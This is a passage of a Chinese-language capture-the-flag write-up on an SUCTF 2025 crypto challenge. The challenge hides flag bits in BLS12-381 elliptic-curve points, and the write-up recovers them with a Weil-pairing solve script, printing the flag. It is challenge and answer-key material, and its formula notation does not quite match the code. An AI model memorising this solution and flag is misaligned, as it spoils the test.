class="hljs-number">0x1a0111ea397fe69a4b1ba7b6434bacd764774b84f38512bf6730d2a0f6b0f6241eabfffeb153ffffb9feffffffffaaab</span><br>K = GF(p)<br>E = EllipticCurve(K, (<span class="hljs-number">0</span>, <span class="hljs-number">4</span>))<br>o = <span class="hljs-number">793479390729215512516507951283169066088130679960393952059283337873017453583023682367384822284289</span><br>n1, n2 = <span class="hljs-number">859267</span>, <span class="hljs-number">52437899</span><br><br><span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>):<br>    G1, G2 = E.random_element(), E.random_element()<br>    <span class="hljs-keyword">if</span>(G1.order() == o <span class="hljs-keyword">and</span> G2.order() == o):<br>        P1, P2 = (o//n1)*G1, (o//n2)*G2<br>        <span class="hljs-keyword">break</span><br><br>cs = [(randrange(<span class="hljs-number">0</span>, o) * P1 + randrange(<span class="hljs-number">0</span>, o) * G2).xy() <span class="hljs-keyword">if</span> i == <span class="hljs-string">&quot;1&quot;</span> <span class="hljs-keyword">else</span> (randrange(<span class="hljs-number">0</span>, o) * G1 + randrange(<span class="hljs-number">0</span>, o) * P2).xy() <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">bin</span>(bytes_to_long(flag))[<span class="hljs-number">2</span>:].zfill(bit_length)]<br><span class="hljs-built_in">print</span>(cs)<br></code></pre></td></tr></table></figure><h3 id="解题"><a class="markdownIt-Anchor" href="#解题"></a> 解题</h3><p>通过搜索是BLS12-381曲线，知道了有良好的双线性配对，正好毕设了解过。</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>P</mi><mn>1</mn></msub><mo>=</mo><mfrac><mi>p</mi><msub><mi>n</mi><mn>2</mn></msub></mfrac><mo>∗</mo><msub><mi>G</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>P</mi><mn>2</mn></msub><mo>=</mo><mfrac><mi>p</mi><msub><mi>n</mi><mn>2</mn></msub></mfrac><mo>∗</mo><msub><mi>G</mi><mn>2</mn></msub><mspace linebreak="newline"></mspace><mtext>当</mtext><mi>f</mi><mi>l</mi><mi>a</mi><mi>g</mi><mtext>的比特位为</mtext><mn>0</mn><mtext>时，我们有</mtext><mi>c</mi><msub><mi>s</mi><mi>i</mi></msub><mo>=</mo><mi>a</mi><mo>∗</mo><msub><mi>P</mi><mn>1</mn></msub><mo>+</mo><mi>b</mi><mo>∗</mo><msub><mi>G</mi><mn>2</mn></msub><mo>=</mo><mi>a</mi><mo>∗</mo><mfrac><mi>p</mi><msub><mi>n</mi><mn>2</mn></msub></mfrac><mo>∗</mo><msub><mi>G</mi><mn>1</mn></msub><mo>+</mo><mi>b</mi><mo>∗</mo><msub><mi>G</mi><mn>2</mn></msub><mspace linebreak="newline"></mspace><mtext>因此当我们用</mtext><msub><mi>n</mi><mn>2</mn></msub><mtext>乘以上式之后，有</mtext><mi>c</mi><msub><mi>s</mi><mi>i</mi></msub><mo>=</mo><mi>a</mi><mo>∗</mo><mi>p</mi><mo>∗</mo><mi>G</mi><mn>1</mn><mo>+</mo><mi>b</mi><mo>∗</mo><msub><mi>n</mi><mn>2</mn></msub><mo>∗</mo><msub><mi>G</mi><mn>2</mn></msub><mo>=</mo><msub><mi>k</mi><mi>i</mi></msub><mo>∗</mo><msub><mi>G</mi><mn>2</mn></msub><mspace></mspace><mspace width="1em"/><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mtext> </mtext><mtext> </mtext><mi>p</mi><mspace linebreak="newline"></mspace><mtext>根据双线性配对的性质</mtext><mi>e</mi><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn><mo separator="true">,</mo><mi>e</mi><mo stretchy="false">(</mo><mi>k</mi><mo>∗</mo><mi>a</mi><mo separator="true">,</mo><mi>a</mi><mo stretchy="false">)</mo><mo>=</mo><msup><mn>1</mn><mi>k</mi></msup><mo>=</mo><mn>1</mn><mspace linebreak="newline"></mspace><mtext>所以只要我们遍历</mtext><mi>c</mi><mi>s</mi><mtext>，然后利用双线性配对就可以判断这个比特为是否为</mtext><mn>0</mn><mtext>；反之，为</mtext><mn>1</mn></mrow><annotation encoding="application/x-tex">P_1=\frac{p}{n_2}*G_1,P_2=\frac{p}{n_2}*G_2 \\当flag的比特位为0时，我们有cs_i=a*P_1+b*G_2=a*\frac{p}{n_2}*G_1+b*G_2 \\因此当我们用n_2乘以上式之后，有cs_i=a*p*G1+b*n_2*G_2=k_i*G_2 \mod p \\根据双线性配对的性质e(a,a)=1,e(k*a,a)=1^k=1 \\所以只要我们遍历cs，然后利用双线性配对就可以判断这个比特为是否为0；反之，为1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.94356em;vertical-align:-0.8360000000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1075599999999999em;"><span style="top:-2.3139999999999996em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8360000000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.94356em;vertical-align:-0.8360000000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1075599999999999em;"><span style="top:-2.3139999999999996em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8360000000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">当</span><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">比</span><span class="mord cjk_fallback">特</span><span class="mord cjk_fallback">位</span><span class="mord cjk_fallback">为</span><span class="mord">0</span><span class="mord cjk_fallback">时</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">有</span><span class="mord mathnormal">c</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.94356em;vertical-align:-0.8360000000000001em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.1075599999999999em;"><span style="top:-2.3139999999999996em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8360000000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord cjk_fallback">因</span><span class="mord cjk_fallback">此</span><span class="mord cjk_fallback">当</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">用</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">乘</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">之</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">有</span><span class="mord mathnormal">c</span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">a</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.6597200000000001em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">G</span><span class="mord">1</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathnormal">b</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.61528em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:-0.03148em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:1em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord cjk_fallback">根</span><span class="mord cjk_fallback">据</span><span class="mord cjk_fallback">双</span><span class="mord cjk_fallback">线</span><span class="mord cjk_fallback">性</span><span class="mord cjk_fallback">配</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">性</span><span class="mord cjk_fallback">质</span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">a</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">e</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">a</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8991079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord">1</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.68333em;vertical-align:0em;"></span><span class="mord cjk_fallback">所</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">只</span><span class="mord cjk_fallback">要</span><span class="mord cjk_fallback">我</span><span class="mord cjk_fallback">们</span><span class="mord cjk_fallback">遍</span><span class="mord cjk_fallback">历</span><span class="mord mathnormal">c</span><span class="mord mathnormal">s</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">然</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">利</span><span class="mord cjk_fallback">用</span><span class="mord cjk_fallback">双</span><span class="mord cjk_fallback">线</span><span class="mord cjk_fallback">性</span><span class="mord cjk_fallback">配</span><span class="mord cjk_fallback">对</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">可</span><span class="mord cjk_fallback">以</span><span class="mord cjk_fallback">判</span><span class="mord cjk_fallback">断</span><span class="mord cjk_fallback">这</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">比</span><span class="mord cjk_fallback">特</span><span class="mord cjk_fallback">为</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">否</span><span class="mord cjk_fallback">为</span><span class="mord">0</span><span class="mord cjk_fallback">；</span><span class="mord cjk_fallback">反</span><span class="mord cjk_fallback">之</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">为</span><span class="mord">1</span></span></span></span></span></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><span class="hljs-keyword">import</span> ast<br><br><span class="hljs-comment"># BLS12-381 curve</span><br>p = <span class="hljs-number">0x1a0111ea397fe69a4b1ba7b6434bacd764774b84f38512bf6730d2a0f6b0f6241eabfffeb153ffffb9feffffffffaaab</span><br>K = GF(p)<br>E = EllipticCurve(K, (<span class="hljs-number">0</span>, <span class="hljs-number">4</span>))<br>o = <span class="hljs-number">793479390729215512516507951283169066088130679960393952059283337873017453583023682367384822284289</span><br>n1, n2 = <span class="hljs-number">859267</span>, <span class="hljs-number">52437899</span><br>cs = ast.literal_eval(<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;chall.txt&quot;</span>).read())<br>cs = [E(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> cs]<br><br>is0=cs[<span class="hljs-number">0</span>]<br>is0=is0*n2<br><br>flag=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> cs:<br>    tmp=is0.weil_pairing(i*n2,o)<br>    <span class="hljs-keyword">if</span> tmp==<span class="hljs-number">1</span>:<br>        flag+=<span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        flag+=<span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-built_in">print</span>(flag)<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(flag,<span class="hljs-number">2</span>)))<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">01010011010101010100001101010100010001100111101101010111011001010011000101100011011011110110110101100101010111110101111101010100001100000101111101011111010100110101010101000011010101000100011001011111010111110011001000110000001100100011010101111101</span><br><span class="hljs-string">b&#x27;SUCTF&#123;We1come__T0__SUCTF__2025&#125;&#x27;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br></code></pre></td></tr></table></figure><h2 id="su_mathgame"><a class="markdownIt-Anchor" href="#su_mathgame"></a> SU_mathgame</h2><h3 id="题目-2"><a class="markdownIt-Anchor" href="#题目-2"></a> 题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span 